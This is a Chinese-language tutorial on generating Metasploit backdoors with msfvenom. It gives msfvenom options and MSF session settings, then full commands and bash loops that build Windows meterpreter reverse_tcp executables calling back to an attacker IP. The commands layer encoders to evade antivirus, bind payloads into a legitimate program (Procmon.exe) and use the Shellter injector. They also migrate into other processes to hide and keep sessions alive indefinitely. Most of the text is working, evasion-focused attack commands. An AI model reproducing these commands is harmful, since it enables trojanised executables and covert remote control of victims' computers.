    0x20 msfvenom命令

    msfvenom部分帮助信息

    Options:
    -l, --list <type> #列出各种类型，如：payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload <payload>  #指定payload
        --list-options       #列出payload的标准、高级和规避选项
    -f, --format <format>    #输出格式
    -e, --encoder <encoder>  #指定编码方式
        --smallest           #最小化可用的payload
    -a, --arch <arch>        #指定目标架构：x86 | x64 | x86_64
        --platform <platform> #指定目标平台
    -o, --out <path>         #输出到文件
    -b, --bad-chars <list>   #设定避免使用字符，如: '\x00\xff'、'\x0f'
    -n, --nopsled <length>   #前置指定长度的nop到payload
        --pad-nops           #指定payload总大小，不够的nop补充
    -s, --space <length>        #设定payload最大长度
    -i, --iterations <count> #payload编码字数
    -c, --add-code <path>    #指定一个附加的win32 shellcode文件
    -x, --template <path>    #指定一个自定义的可执行文件作为模板，在其中插入payload
    -k, --keep               #保护模板程序的行为，注入的payload在新进程运行
    -v, --var-name <value>   #指定用于某些输出格式的自定义变量名称
    -t, --timeout <second>   #从STDIN读取payload时延时（默认30秒，禁用为0）
    PrependMigrate=true PrependMigrateProc=进程名 #自动迁移到指定进程

    MSF几个重要命令：

    1. msf>set EnableStageEncoding true #尝试使用不同的编码器对stage进行编码
    2. msf>set stageencoder x86/fnstenv_mov
    3. msf>set stageencodingfallback false
    4. msf>set ExitOnSession false #一直监听，可接收多session，防止session假死
    5. msf>set SessionCommunicationTimeout 0 #默认情况下，一个会话在5分钟内无任务活动就会杀死，设置为0防止被杀
    6. msf>set SessionExpirationTimeout 0 #默认情况下，一个会话在一周后被强制关闭，设置为0可永久不会被关闭
    7. sessions -l #查看所有会话
    8. jobs #查看所有活动
    9. exploit -j -z #-j：后台运行，-z：可持续监听
    10. PrependMigrate=true PrependMIgrateProx=xxx.exe #使这个程序会默认迁移到xxx.exe进程

    一般后门文件执行后会单独开启一个进程，这样容易被发现后关闭，一行命令使这个程序会默认迁移到xxx.exe进程

    msfvenom -p windows/meterpreter/reverse_tcp lhost=[attack_ip] lport=[port] -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=xxx.exe -f exe -o  shell.exe

    0x22 MSF生成的各种后门测试上线后再杀毒扫描

    纯后门

    1. msfvenom -p windows/meterpreter/reverse_tcp lhost=[attack_ip] lport=[port] -f exe -o test0.exe

    指定编码处理、编码次数、去除指定字符的后门

    1. msfvenom -p windows/meterpreter/reverse_tcp lhost=[attack_ip] lport=[port] -e x86/shikata_ga_nai -i 13 -b “\x00” -f exe -o test1.exe

    sh脚本编码次数

    #!/bin/bash

for num in {1..20}
do
msfvenom -p windows/meterpreter/reverse_tcp lhost=[attack_ip] lport=[port] -e x86/shikata_ga_nai -i $num -b "\x00" -f exe -o test1_$num.exe
done

    1. 例如Procmon.exe
    2. msfvenom -p windows/meterpreter/reverse_tcp lhost=[attack_ip] lport=[port] -x Procmon.exe -f exe -o test2.exe #可能会无法正常运行

    绿色文件捆绑+单编码处理+N次编码次数后门

    1. msfvenom -p windows/meterpreter/reverse_tcp lhost=[attack_ip] lport=[port] -x Procmon.exe -e x86/shikata_ga_nai -i 13 -f exe -o test3.exe #编码次数不同，免杀结果可能不同

    sh脚本编码次数

    for num in {1..20}
do
msfvenom -p windows/meterpreter/reverse_tcp lhost=[attack_ip] lport=[port] -x Procmon.exe -e x86/shikata_ga_nai -i $num -f exe -o test3_$num.exe
done

    绿色文件捆绑+多编码处理+N次编码次数后门

    1. msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp lhost=[attack_ip] lport=[port] -e x86/shikata_ga_nai -i 7 -f raw | msfvenom -a x86 –platform windows -e x86/alpha_upper -i 5 -f raw | msfvenom -a x86 –platform windows -e x86/countdown -i 3 -x Procmon.exe -f exe -o test4.exe #还有很多编码处理方式

    sh脚本编码次数

    for b in {3..5}
do 
    for c in {3..5}
    do
        for d in {3..5}
        do
        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=[attack_ip] lport=[port] -e x86/shikata_ga_nai -i $b -f raw | msfvenom -a x86 --platform windows -e x86/alpha_upper -i $c -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i $d -x Procmon.exe -f exe -o test4_$b$c$d.exe
        done
    done

    捆绑工具shellter

    1. shellter：一种动态shellcode注入工具（当前仅32位应用）。
    2. shellter使用帮助
    3. 依次执行命令
    4. 双击运行shellter.exe
    5. A #自动模式
    6. N #不检测版本
    7. 指定Procmon.exe #Procmon.exe会被备份在Shellter_Backups目录下
    8. L #列出payload
    9. 1 #指定哪个payload
    10. 控制者IP
    11. 控制者port
    12. [回车]
